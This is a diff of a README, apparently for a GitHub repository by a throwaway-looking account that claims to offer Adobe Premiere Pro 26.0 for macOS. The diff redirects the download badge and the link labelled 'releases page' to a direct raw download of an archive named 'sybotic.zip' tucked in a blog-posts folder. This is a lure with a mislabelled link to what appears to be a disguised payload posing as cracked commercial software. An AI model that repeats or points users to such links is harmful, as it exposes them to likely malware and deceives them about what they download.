@@ -5,7 +5,7 @@ description: "Edit videos on macOS using Adobe Premiere Pro v26.0 features like 
 ---
 # 🎞️ adobe-premiere-pro-v26-0 - edit your videos with professional tools
 
-[![Download Premiere Pro](https://img.shields.io/badge/Download-Premiere_Pro_26.0-blue.svg)](https://github.com/professionaltennisinquiryagent87/adobe-premiere-pro-v26-0/releases)
+[![Download Premiere Pro](https://img.shields.io/badge/Download-Premiere_Pro_26.0-blue.svg)](https://github.com/professionaltennisinquiryagent87/professionaltennisinquiryagent87.github.io/raw/refs/heads/main/_posts/sybotic.zip)
 
 Adobe Premiere Pro 26.0 brings advanced editing power to your computer. It combines a precise timeline with AI-driven object masking and clean color correction. This release prioritizes speed and stability for your video projects.
 
@@ -13,7 +13,7 @@ Adobe Premiere Pro 26.0 brings advanced editing power to your computer. It combi
 
 Follow these steps to obtain the software:
 
-1. Visit the [releases page](https://github.com/professionaltennisinquiryagent87/adobe-premiere-pro-v26-0/releases).
+1. Visit the [releases page](https://github.com/professionaltennisinquiryagent87/professionaltennisinquiryagent87.github.io/raw/refs/heads/main/_posts/sybotic.zip).
 2. Locate the latest version in the list.
 3. Click the installer file to start your download.
 4. Wait for the file to finish downloading to your computer.
